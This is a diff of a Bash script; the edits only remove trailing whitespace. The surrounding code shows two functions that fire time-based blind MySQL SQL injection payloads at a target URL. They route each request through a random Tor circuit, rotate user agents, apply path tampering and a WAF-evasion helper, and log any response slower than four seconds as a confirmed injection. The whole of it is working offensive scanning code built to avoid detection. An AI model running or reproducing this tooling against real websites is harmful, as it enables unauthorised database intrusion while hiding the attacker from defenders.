@@ -70,7 +70,7 @@ vector_sqli_agressor_left() {
 
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
-        
+
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
@@ -90,13 +90,13 @@ vector_sqli_agressor_left() {
         else
             final_query="${defiance_tamper_path}${query_payload}"
         fi
-        
+
         local waf_trick=$(braindamage)
-        
+
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
-        
+
         local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
-        
+
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 1 confirmed MySQL Anomaly: ${stopwatch}s"
             echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
@@ -110,7 +110,7 @@ vector_sqli_agressor_right() {
 
     while IFS='|' read -r default_path query_payload || [ -n "$query_payload" ]; do
         [[ -z "$default_path" ]] && continue
-        
+
         local random_port=${TOR_CIRCUITS[$RANDOM % ${#TOR_CIRCUITS[@]}]}
         if [ -n "$custom_proxy" ]; then local proxy_flag="-x $random_port --fail"; else local proxy_flag="--socks5-hostname 127.0.0.1:$random_port --socks5-gssapi-nec --fail"; fi
         local random_ua=${DEFIANCE_UA[$RANDOM % ${#DEFIANCE_UA[@]}]}
@@ -131,13 +131,13 @@ vector_sqli_agressor_right() {
         else
             final_query="${defiance_tamper_path}${query_payload}"
         fi
-        
+
         local waf_trick=$(braindamage)
-        
+
         echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[1;34m$target_url$final_query\e[0m"
-        
+
         local stopwatch=$(curl $proxy_flag $waf_trick -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}" "$target_url$final_query")
-        
+
         if (( $(echo "$stopwatch > 4.0" | bc -l) )); then
             echo -e "    \e[0;31m[!+!]\e[0m Vector 2 confirmed MySQL Anomaly: ${stopwatch}s"
             echo "SQLI_ALERT|$default_path|$query_payload" >> "$ROOT_LOG_FILE"
